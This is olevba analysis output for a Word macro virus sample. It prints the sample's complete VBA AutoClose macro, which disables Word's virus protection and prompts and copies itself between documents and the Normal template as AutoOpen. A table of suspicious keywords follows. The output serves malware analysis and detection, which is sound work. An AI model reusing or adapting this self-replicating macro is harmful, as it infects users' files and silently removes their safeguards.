olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Temp29-ebfb6295e08cefb7878abd8fe35b491e6654b03c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Temp29-ebfb6295e08cefb7878abd8fe35b491e6654b03c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
On Error GoTo ou: Options.VirusProtection = False: Options.SaveNormalPrompt = False: Options.ConfirmConversions = False
Set NTVBC = NormalTemplate.VBProject.VBComponents.Item(1): Set ADVBC = ActiveDocument.VBProject.VBComponents.Item(1)
ad = ADVBC.codemodule.CountOfLines: nt = NTVBC.codemodule.CountOfLines: EXPFN = Environ("temp") & "\~CL7610_2.~MP"
If nt > 28 And ad > 28 Then GoTo ou
If nt < 29 Then
    Set dhst = NTVBC
    Set shst = ADVBC
Else
    Set dhst = ADVBC
    Set shst = NTVBC
End If
shst.Name = dhst.Name
shst.Export (EXPFN)
With dhst.codemodule
.AddFromFile (EXPFN)
.deletelines 1, 4
temp$ = .lines(1, 1)
.replaceline 1, "Sub AutoOpen()"
.replaceline 19, ".replaceline 1," & Chr$(34) & temp$ & Chr$(34)
temp$ = .lines(28, 1)
.replaceline 28, "Sub ToolsMacro()"
.replaceline 22, ".replaceline 28," & Chr$(34) & temp$ & Chr$(34)
End With
Kill (EXPFN)
ou:
End Sub
Sub ViewVBCode()
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

